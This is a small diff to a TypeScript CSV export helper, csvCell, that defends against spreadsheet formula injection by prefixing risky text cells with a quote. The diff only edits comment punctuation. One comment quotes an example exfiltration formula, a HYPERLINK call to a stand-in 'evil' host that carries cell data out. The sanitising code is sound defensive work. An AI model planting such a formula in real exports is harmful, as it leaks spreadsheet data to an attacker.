@@ -4,8 +4,8 @@
 //
 // csvCell does two things, in order:
 //   1. CSV FORMULA-INJECTION NEUTRALIZATION (OWASP): a TEXT value whose first
-//      character is a spreadsheet formula trigger — `=`, `+`, `-`, `@`, TAB
-//      (\t), or CR (\r) — is prefixed with a single quote (') so Excel / Google
+//      character is a spreadsheet formula trigger: `=`, `+`, `-`, `@`, TAB
+//      (\t), or CR (\r), is prefixed with a single quote (') so Excel / Google
 //      Sheets / LibreOffice render it as literal text and NEVER execute it
 //      (e.g. a client note of `=HYPERLINK("http://evil?"&A1,"x")` can no longer
 //      run when the owner opens the export). Only text-origin values are
@@ -29,7 +29,7 @@ export function csvCell(value: unknown): string {
     s = JSON.stringify(value);
     textOrigin = true;
   } else {
-    // number / boolean / bigint — never a formula vector; preserve as-is so
+    // number / boolean / bigint, never a formula vector; preserve as-is so
     // numeric cells (incl. negatives like -50) stay numeric, not text.
     s = String(value);
     textOrigin = false;
